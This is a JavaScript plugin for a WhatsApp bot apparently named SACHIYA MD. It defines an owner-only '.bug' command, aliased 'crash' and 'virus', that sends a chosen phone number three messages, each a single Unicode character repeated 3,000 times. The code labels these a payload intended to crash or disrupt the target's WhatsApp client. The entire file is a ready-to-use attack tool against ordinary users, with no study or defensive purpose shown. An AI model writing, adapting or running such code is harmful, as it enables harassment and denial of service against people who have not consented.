const { cmd } = require("../command");

const SACHIYA_LOGO = "https://github.com/sachirainduwara/Bot/blob/main/images/SACHIYA%20MD.png?raw=true";

cmd({
  pattern: "bug",
  alias: ["sendbug", "crash", "virus"],
  react: "💣",
  desc: "Send high-performance system bug payload",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { from, q, isCreator, reply }) => {
  try {
    // Check if the user is the bot owner
    if (!isCreator) {
      return reply("❌ *This is an Owner-only command! You cannot use this.*");
    }

    if (!q) {
      return reply(`╭━━━〔 *SACHIYA MD - BUG SYSTEM* 〕━━━\n` +
                   `┃ 📌 *Usage:* \`.bug <target_number>\`\n` +
                   `┃ 📌 *Example:* \`.bug 9477xxxxxxx\`\n` +
                   `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n> *✨ Powered by SACHIYA MD* 🚀`);
    }

    // Clean target number format
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Step 1: React with loading emoji
    await conn.sendMessage(from, { react: { text: "⏳", key: mek.key } }).catch(() => {});

    // Notify initiation with SACHIYA MD UI
    await conn.sendMessage(from, {
      image: { url: SACHIYA_LOGO },
      caption: `╭━━━〔 *SACHIYA-MD BUG ENGINE* 〕━━━\n` +
               `┃ 🎯 *Target:* \`${q}\`\n` +
               `┃ 🔄 *Status:* Initializing Payload...\n` +
               `┣━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
               `┃ ✨ *Powered by SACHIYA MD* 🚀\n` +
               `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━`
    }, { quoted: mek });

    // Heavy payload strings
    const bugPayloads = [
      "꧙".repeat(3000),
      "ྮ".repeat(3000),
      "؜".repeat(3000)
    ];

    for (let i = 0; i < bugPayloads.length; i++) {
      await conn.sendMessage(target, { text: bugPayloads[i] }).catch(() => {});
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    // Step 2: Success reaction and response
    await conn.sendMessage(from, { react: { text: "✅", key: mek.key } }).catch(() => {});

    await conn.sendMessage(from, {
      image: { url: SACHIYA_LOGO },
      caption: `╭━━━〔 *SACHIYA-MD BUG SUCCESS* 〕━━━\n` +
               `┃ 🎯 *Target:* \`${q}\`\n` +
               `┃ 📊 *Status:* Payload Sent Successfully!\n` +
               `┣━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
               `┃ ✨ *Powered by SACHIYA MD* 🚀\n` +
               `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━`
    }, { quoted: mek });

  } catch (error) {
    console.error("[BUG PLUGIN ERROR]:", error);
    await conn.sendMessage(from, { react: { text: "❌", key: mek.key } }).catch(() => {});
    reply("❌ *An error occurred while executing the bug payload.*");
  }
});
